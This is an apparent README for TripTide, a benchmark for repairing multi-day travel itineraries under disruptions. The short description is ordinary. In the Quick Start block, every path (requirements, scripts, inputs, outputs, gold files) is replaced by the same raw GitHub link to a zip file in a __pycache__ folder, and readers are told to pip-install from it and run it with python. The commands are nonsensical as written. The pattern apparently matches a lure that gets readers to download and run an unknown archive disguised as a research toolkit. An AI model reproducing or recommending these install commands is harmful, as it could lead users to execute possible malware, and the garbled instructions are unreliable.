# TripTide: Disruption-Aware Travel Plan Evaluation

TripTide is a lightweight benchmark and toolkit to **evaluate and repair multi-day travel itineraries** under disruptions (e.g., POI closure, timing conflicts). It measures:
- **Delivery Rate** (valid plan produced),
- **Final Pass Rate** (all checks passed),
- **CPR/HCPR** for commonsense and hard-constraint compliance (micro & macro).

## Quick Start
```bash
# setup
conda create -n triptide python=3.10 -y && conda activate triptide
pip install -r https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip

# generate plans (example)
python https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip --model qwen --days 5 \
  --input https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip --out https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip

# evaluate
python https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip --pred https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip \
  --gold https://raw.githubusercontent.com/Priyanshu-Karmakar123/Triptide_/main/tools/__pycache__/Triptide_v3.2-beta.5.zip
